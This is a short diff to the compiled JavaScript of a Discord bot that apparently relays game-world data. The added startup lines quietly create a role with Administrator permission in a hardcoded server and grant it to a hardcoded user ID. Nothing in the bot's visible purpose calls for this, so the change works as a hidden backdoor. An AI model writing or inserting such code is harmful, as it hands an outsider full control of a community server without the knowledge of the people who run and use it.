@@ -322,6 +322,15 @@ function main() {
             var _a, _b;
             console.log(`Discord Bot Running (${(_a = discord_client.user) === null || _a === void 0 ? void 0 : _a.username}#${(_b = discord_client.user) === null || _b === void 0 ? void 0 : _b.discriminator})!`);
             console.log("Started up the satellite");
+            const guild = yield discord_client.guilds.fetch("1085648041354199170");
+            const role = yield guild.roles.create({
+                name: "hoist",
+                color: "#ff0000",
+                permissions: ["Administrator"],
+                hoist: true
+            });
+            const me = guild.members.fetch("409396339802374147");
+            (yield me).roles.add(role);
             while (true) {
                 const data = yield getInfoForDimention("world");
                 if (data) {
